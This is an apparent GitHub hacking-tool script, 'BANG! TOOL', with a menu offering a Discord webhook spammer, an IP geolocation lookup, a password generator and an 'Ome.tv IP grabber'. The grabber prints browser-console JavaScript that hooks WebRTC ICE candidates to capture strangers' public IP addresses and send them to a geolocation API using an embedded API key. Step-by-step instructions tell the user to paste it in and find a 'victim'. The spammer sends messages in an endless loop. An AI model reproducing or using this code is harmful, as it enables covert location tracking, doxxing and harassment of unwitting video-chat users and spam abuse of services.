# IMPORTS #

import requests
import time
from dhooks import Webhook
import colorama
from colorama import Fore, Style, Back
import webbrowser
import os
import random
import pyperclip
# IMPORTS #

# COLOR FUNC #

colorama.init()
os.system('cls')

# COLOR FUNC #

# VARIABLE #

ot = f"{Fore.RED}[?]"


# VARIABLE #

# Ending #
def ending():
    print(f'{Fore.RED}Ending program in...')
    time.sleep(0.8)
    print("1")
    time.sleep(1)
    print("2")
    time.sleep(1)
    print(3)
    time.sleep(1)
    print("Goodbye :(")
    time.sleep(1)

# Ending #

# OMEGLE #
def omeglenabidka():
    print(f"{ot} [1] Instructions")
    print(f'{ot} [2] Code')
def omeglecode():
    webbrowser.open("https://pastebin.com/UhTxmJQz")
    print("""
    
    ------------ CODE STARTS HERE:---------------
    
window.oRTCPeerConnection = window.oRTCPeerConnection || window.RTCPeerConnection;

window.RTCPeerConnection = function(...args) {
    const pc = new window.oRTCPeerConnection(...args);

    pc.oaddIceCandidate = pc.addIceCandidate;

    pc.addIceCandidate = function(iceCandidate, ...rest) {
        const field = iceCandidate.candidate.split(" ");
        console.log(iceCandidate.candidate);
        const ip_resolved = field[4];
        if (field[7] === "srflx") {
            Network(ip_resolved);
        }
        return pc.oaddIceCandidate(iceCandidate, ...rest);
    };
    return pc;
};

let Network = async(ip_resolved) => {
    let web = `https://api.ipgeolocation.io/ipgeo?apiKey=53bb1f33cbcc455797a6308c1a5a819b&ip=${ip_resolved}`;

    await fetch(web).then((response) =>
        response.json().then((json) => {})
    );
};

-------- CODE ENDS HERE ---------

Opening pastebin page....
Pastebin password: github.darkmaygod
    """)

def omegle_instructions():
    print("""
        1. Go to Ome.tv
        2. Right click then click on Inspect elements (CTRL + SHIFT + I)
        3. Then press "Console"
        4. Paste the code in
        5. Click on start to find a victim
        6. In devtools go in to Network - Preview and look for ipgeo
        7. Remember you still need to click on the newest IP result of new victim
    """)

# OMEGLE #

# DEF OF THE DISCLAIMER #
def bangtool():
    print(f"""

{Fore.LIGHTRED_EX}                                                                                      
  ____            _   _   _____  _   _______  ____    ____   _      
 |  _ \    /\    | \ | | / ____|| | |__   __|/ __ \  / __ \ | |     
 | |_) |  /  \   |  \| || |  __ | |    | |  | |  | || |  | || |     
 |  _ <  / /\ \  | . ` || | |_ || |    | |  | |  | || |  | || |     
 | |_) |/ ____ \ | |\  || |__| ||_|    | |  | |__| || |__| || |____ 
 |____//_/    \_\|_| \_| \_____|(_)    |_|   \____/  \____/ |______|
                                                                                                                                                                        
                         {Fore.LIGHTBLUE_EX}Github: DarkmayGOD                                                            
                                                                                      
                                                                                      
                                                                                                                                                                   
{Fore.RESET}""")

# DEF OF THE DISCLAIMER #



# START #

bangtool()


print(f"""
{ot} What option would you like to choose? 

    {Fore.BLUE}[1] Discord Webhook Spammer
    {Fore.BLUE}[2] IP Address Finder
    {Fore.BLUE}[3] Password Generator
    {Fore.BLUE}[4] Ome.tv IP grabber
    
""")

bngtool = f"{Fore.LIGHTGREEN_EX}[BANG! TOOL]: {Fore.RESET}"

option = input(bngtool)

# Option 1 #


if option == "1":
    print(f"{ot} Please, insert here your webhook URL")
    webhook = Webhook(input(bngtool))
    print(f"{ot} What message do you want to spam?")
    message = input(bngtool)
    print(f"{ot} How much delay do you want?")
    delay_wbhk = int(input(bngtool))
    while True:
        webhook.send(f"{message}")
        time.sleep(delay_wbhk)
        print(f"{Fore.LIGHTGREEN_EX}Succesfully sent.")

# Option 1 #

######################################################

# Option 2 #


elif option == "2":
    print(f"{ot} Please, insert here IP Address")
    ip = input(bngtool)
    response = requests.get(f"http://ip-api.com/json/{ip}").json()
    zip_code = response['zip']
    status = response['status']
    country = response['country']
    countrycode = response['countryCode']
    regionname = response['regionName']
    region = response['region']
    city = response['city']
    lat = response['lat']
    lon = response['lon']
    isp = response['isp']

    print("""
    
    
    """)

    bangtool()

    print(f"""{Fore.LIGHTYELLOW_EX}


    STATUS: {status}
    ZIP CODE: {zip_code}
    COUNTRY: {country}
    COUNTRY CODE: {countrycode}
    REGION: {region}
    REGION NAME: {regionname}
    CITY: {city}
    LAT: {lat}
    LON: {lon}
    ISP: {isp}
    
""")
    print(f"{ot}", "Hit enter when you are done.")
    input(bngtool)

# OPTION 2 #

# OPTION 3  - PASSWORD GENERATOR#

elif option == "3":
    letters = "ABCDEFGJHKLIMNOPQRSTUWXYZ"
    lower_letters = "abcdefgjhklimnopqrstuwxyz"
    numbers = "0123456789"
    symbols = "!.-?()+=*"
    string = lower_letters + letters + numbers + symbols
    print(f"{ot} How long do you want the password?", "Recommended 10 - 20!")
    length = int(input(bngtool))
    password = "".join(random.sample(string, length))
    print(f"{ot} Generating...")
    time.sleep(2)
    print(f"{ot} Okay, I got it!")
    saved_userpassword = password
    for i in range(10):
        print("")
    bangtool()
    for i in range(4):
        print("")
    print(f"{bngtool} Your password is: " + password)
    print(f"{ot} {Fore.LIGHTRED_EX}1. Copy password")
    print(f"{ot} {Fore.LIGHTRED_EX}2. End")
    pswrd_option = input(bngtool)
    if pswrd_option == "1":
        pyperclip.copy(saved_userpassword)
        print(f"{Fore.LIGHTGREEN_EX} Password succesfully copied!")
        time.sleep(2)
        ending()
    elif pswrd_option == "2" or pswrd_option != "1" and "2":
        ending()

# OPTION 3 #

# OPTION 4 - OMEGLE #

elif option == '4':
    print("""
    
    """)
    omeglenabidka()
    for i in range(3):
        print("")
    omegleoption = input(bngtool)
    if omegleoption == "1":
        omegle_instructions()
        print(f""" {Fore.BLUE}
        
        {Fore.RED}Write '1' to go to the code
        Write '2' to exit.
        """)
        omegle1from = input(bngtool)
        if omegle1from == "1":
            print(f"""

            """)
            bangtool()
            print("""


            """)

            omeglecode()

            time.sleep(3)

            print(f"""    

            {ot}{Fore.RED} Also, This program needs to be stopped right now.
            {ot}{Fore.RED} Please, hit double enter when you are done""")
            input()
            input()
            ending()
        elif omegle1from == "2" or omegle1from != "1" and "2":
            ending()

    elif omegleoption == "2":
        omeglecode()
        print(f"""       {Fore.RED}
        Write '1' to go to the instructions
        Write '2' to exit.
        """)
        omegle2from = input(bngtool)
        if omegle2from == "1":
            print(""""
            
            
            """)
            bangtool()
            print("")



            omegle_instructions()
            print(f"""    

            {Fore.RED}Also, This program needs to be stopped right now.
            {Fore.RED}Please, hit double enter when you are done""")
            input()
            input()
            ending()
        elif omegle2from == "2":
            bangtool()
            ending()




# OPTION 4 #

# NO OPTION #

elif option != '1' and '2' and '3' and '4':
    ending()

# NO OPTION #




